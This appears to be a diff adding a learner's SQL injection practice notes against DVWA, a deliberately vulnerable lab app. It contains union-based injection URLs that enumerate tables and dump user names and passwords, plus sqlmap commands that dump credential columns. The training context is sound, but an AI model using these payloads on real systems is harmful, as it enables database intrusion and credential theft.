@@ -42,3 +42,41 @@ Union Base
 	-Integer
 Error Base
 Blind Base
+
+
+day 22
+burp suite pro setup guide
+
+integer sql 
+
+sample 1 without using burp suite
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3 union select 111111111,group_concat(table_name) from information_schema.tables where table_schema=database()-- -&Submit=Submit#
+
+sample 1 with using burp suite
+Step 5
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3%20union%20select%20111111111,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--%20-&Submit=Submit#
+
+Step6
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3%20union%20select%20111111111,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=0x7573657273--%20-&Submit=Submit#
+
+Step7
+[192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3%20union%20select%20111111111,group_concat(0x3C62722F3E,user,0x3a3a,password)%20from%20users--%20-&Submit=Submit#]
+
+192.168.0.142/DVWA-2.4/vulnerabilities/sqli/?id=-3 union select group_concat(0x3C62722F3E,user,0x3a3a,password),2 from users-- -&Submit=Submit#
+
+
+Fix Error Method
+SELECT first_name, last name FROM users WHERE user_id = ('1')--+');
+
+sqlmap 
+sqlmap -u "http://192.168.0.1/index.php?id=2" --current-db --cookie=""
+sqlmap -u "http://192.168.0.1/index.php?id=2" --cookie="" --tables -D dvwa
+sqlmap -u "http://192.168.0.1/index.php?id=2" --cookie="" --columns -T users -D dvwa
+sqlmap -u "http://192.168.0.1/index.php?id=2" --cookie="" --dump -C user,password -T users -D dvwa
+sqlmap -u http://192.168.0.1/index.php?id=2 --dump samu_adr -D
+
+sqlmap second method 
+subl low.req
+put all information of the website from burp
+
+>>sqlmap -r low.req --current-db -p id
